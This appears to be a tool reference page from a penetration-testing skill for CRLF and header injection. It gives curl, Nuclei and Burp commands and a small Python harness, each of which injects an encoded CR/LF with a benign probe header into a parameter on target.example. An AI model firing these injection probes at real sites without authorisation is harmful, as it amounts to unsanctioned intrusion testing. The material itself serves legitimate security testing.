# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`crlf-and-header-injection`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -D - -o /dev/null --path-as-is 'https://target.example/set-lang?lang=en%0d%0aX-Crlf-Probe:crlf7788'` | Send an encoded CRLF and show whether the probe header appears in the response | Cross-platform |
| `Nuclei` | `nuclei -u https://target.example -t http/cves/ -tags crlf` | Run CRLF and response-splitting templates that look for a reflected injected header | Cross-platform |
| `Burp Suite Repeater` | `Insert %0d%0a sequences in a parameter and inspect the raw response header block` | Observe header boundaries directly to distinguish a real split from body reflection | Cross-platform |

## Minimal Script Shape

A CRLF header-injection harness: it submits an encoded CR/LF plus a benign probe header and reports whether that header materialises as a real response header.

```python
import urllib.request

BASE = "https://target.example/set-lang?lang="
INJECT = "en\r\nX-Crlf-Probe: crlf7788"

def response_headers(raw_value):
    # pass the value already containing CR/LF to observe writer handling
    req = urllib.request.Request(BASE + urllib.parse.quote(raw_value, safe=""))
    with urllib.request.urlopen(req, timeout=10) as r:
        return {k.lower(): v for k, v in r.headers.items()}

import urllib.parse
hdrs = response_headers(INJECT)
injected = "x-crlf-probe" in hdrs
print({"injected_header_present": injected,
       "verdict": "CRLF reached the header writer" if injected else "neutralised"})
```
